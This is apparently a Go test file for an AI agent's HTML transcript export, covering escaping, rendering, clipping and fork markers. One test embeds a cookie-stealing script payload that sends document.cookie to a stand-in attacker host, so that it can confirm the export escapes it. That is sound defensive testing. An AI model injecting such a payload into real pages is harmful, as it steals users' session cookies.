package agent

import (
	"encoding/json"
	"strings"
	"testing"
)

// A transcript records untrusted content: a session that read a hostile file
// must not produce a page that executes it when someone opens it.
func TestExportEscapesUntrustedContent(t *testing.T) {
	const attack = `<script>fetch('https://evil.example/'+document.cookie)</script>`
	events := []Event{
		ev(1, EvUserMessage, Message{Text: "read the file"}),
		ev(2, EvActionRequested, ActionRequested{CallID: "c1", Tool: "read"}),
		ev(3, EvObservation, Observation{CallID: "c1", Tool: "read", Content: attack}),
		ev(4, EvAgentMessage, Message{Text: "The file contains " + attack}),
	}
	out := ExportHTML("s1", events)

	if strings.Contains(out, "<script>fetch") {
		t.Fatal("tool output was rendered as live markup; a hostile file would " +
			"execute when the transcript is opened")
	}
	if !strings.Contains(out, "&lt;script&gt;") {
		t.Error("the content should still be visible, escaped")
	}
}

func TestExportRendersTheConversation(t *testing.T) {
	events := append(fullSession(),
		ev(9, EvSessionEnded, SessionEnded{
			Reason: TermCompleted, Turns: 3, TokensIn: 12345, TokensOut: 678,
		}))
	out := ExportHTML("sess-42", events)

	for _, want := range []string{
		"fix the bug", "Reading the file.", "Done.",
		"sess-42", "completed", "12,345", // thousands separators
	} {
		if !strings.Contains(out, want) {
			t.Errorf("export is missing %q", want)
		}
	}
	if !strings.HasPrefix(out, "<!doctype html>") {
		t.Error("output should be a complete document")
	}
	// Self-contained: nothing to fetch, so it works from an air-gapped machine.
	if strings.Contains(out, "http://") || strings.Contains(out, "https://") {
		t.Error("the page must not reference external resources")
	}
}

func TestExportShowsTheTaskList(t *testing.T) {
	events := []Event{
		ev(1, EvUserMessage, Message{Text: "do three things"}),
		ev(2, EvTodoUpdated, TodoList{Items: []Todo{
			{ID: "1", Text: "read the code", Status: "done"},
			{ID: "2", Text: "fix the bug", Status: "in_progress"},
		}}),
	}
	out := ExportHTML("s1", events)
	if !strings.Contains(out, "read the code") || !strings.Contains(out, `class="done"`) {
		t.Error("the task list and its statuses should be rendered")
	}
}

func TestExportHandlesAnEmptySession(t *testing.T) {
	out := ExportHTML("s1", nil)
	if !strings.HasPrefix(out, "<!doctype html>") || !strings.Contains(out, "</html>") {
		t.Error("an empty session should still produce a valid document")
	}
}

func TestExportClipsHugeToolOutput(t *testing.T) {
	huge := strings.Repeat("x", 100000)
	events := []Event{
		ev(1, EvActionRequested, ActionRequested{CallID: "c1", Tool: "bash"}),
		ev(2, EvObservation, Observation{CallID: "c1", Tool: "bash", Content: huge}),
	}
	out := ExportHTML("s1", events)
	if len(out) > 60000 {
		t.Errorf("export is %d bytes; huge output should be clipped", len(out))
	}
	if !strings.Contains(out, "more characters") {
		t.Error("the clip should say how much was omitted")
	}
}

var _ = json.Marshal

// A fork shows as a divider naming the step the conversation went on from.
func TestExportMarksAFork(t *testing.T) {
	page := ExportHTML("s1", []Event{
		ev(1, EvUserMessage, Message{Text: "one"}),
		ev(2, EvForked, Forked{ThroughSeq: 1}),
	})
	if !strings.Contains(page, "forked at step 1") {
		t.Fatal("the export shows no fork")
	}
}
